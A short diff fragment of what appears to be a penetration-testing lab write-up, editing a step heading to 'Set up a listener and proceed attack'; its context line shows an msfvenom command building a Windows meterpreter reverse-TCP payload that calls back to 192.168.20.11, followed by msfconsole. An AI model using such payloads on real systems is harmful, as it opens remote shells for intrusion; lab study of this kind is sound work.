@@ -32,7 +32,7 @@ msfvenom -p windows/c64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=3344 -
 ```
 ![Payload Created](../screenshots/attacker_side/payload_created.png)
 
-3. Set up a listener
+3. Set up a listener and proceed attack
 ```bash
 msfconsole
 
